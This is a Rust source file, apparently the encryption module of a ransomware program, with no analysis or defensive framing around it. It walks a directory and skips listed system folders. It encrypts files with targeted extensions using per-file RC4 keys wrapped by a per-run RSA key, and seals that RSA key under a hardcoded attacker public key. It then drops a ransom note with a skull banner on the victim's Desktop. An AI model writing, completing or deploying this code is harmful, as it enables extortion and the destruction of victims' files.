use std::{
    fs::File,
    io::Write,
    path::{Path, PathBuf},
};

use rsa::{
    traits::{PrivateKeyParts, PublicKeyParts},
    RsaPublicKey,
};
use walkdir::WalkDir;

use crate::{
    crypt::{
        encrypt_file_with_rc4, encrypt_rc4_key_with_rsa, encrypt_rsa_key_with_hardcoded_key,
        generate_random_rc4_key, generate_rsa_keypair,
    },
    resources::{ALLOWED_EXTENSIONS, ENCRYPTION_NOTE, KEY_PATH, SKIP_DIRS, SKULL},
};

pub fn encrypt_files_in_directory(
    directory: &str,
    hardcoded_pub_key: &RsaPublicKey,
) -> std::io::Result<()> {
    let (private_key, public_key) = generate_rsa_keypair();
    let encrypted_rsa_key = encrypt_rsa_key_with_hardcoded_key(&private_key, hardcoded_pub_key);

    // Save encrypted RSA key to a file
    let rsa_key_path = Path::new(KEY_PATH);
    let mut rsa_key_file = File::create(rsa_key_path)?;
    rsa_key_file.write_all(&encrypted_rsa_key)?;

    for entry in WalkDir::new(directory).into_iter().filter_map(|e| e.ok()) {
        let path = entry.path();

        if path.is_file() {
            if let Some(parent) = path.parent() {
                if SKIP_DIRS.iter().any(|d| parent.ends_with(d)) {
                    continue;
                }
            }

            if let Some(ext) = path.extension() {
                if ALLOWED_EXTENSIONS.iter().any(|&e| ext == e) {
                    let mut rc4_key = generate_random_rc4_key();
                    let encrypted_rc4_key = encrypt_rc4_key_with_rsa(&rc4_key, &public_key);
                    encrypt_file_with_rc4(path, &rc4_key, &encrypted_rc4_key)?;

                    for byte in rc4_key.iter_mut() {
                        *byte = 0;
                    }

                    for byte in private_key.n().to_bytes_le().iter_mut() {
                        *byte = 0;
                    }

                    for byte in private_key.d().to_bytes_le().iter_mut() {
                        *byte = 0;
                    }
                }
            }
        }
    }

    write_encryption_note_to_desktop()?;

    Ok(())
}

pub fn write_encryption_note_to_desktop() -> std::io::Result<()> {
    #[cfg(windows)]
    let desktop_path = PathBuf::from(env!("USERPROFILE")).join("Desktop");

    #[cfg(not(windows))]
    let desktop_path = PathBuf::from(env!("PATH_TO_ENCRYPT"));

    let note_path = desktop_path.join("encryption_note.txt");

    let mut note_file = File::create(note_path)?;
    note_file.write_all(SKULL.as_bytes())?;
    note_file.write_all(b"\n\n")?;
    note_file.write_all(ENCRYPTION_NOTE.as_bytes())?;

    Ok(())
}
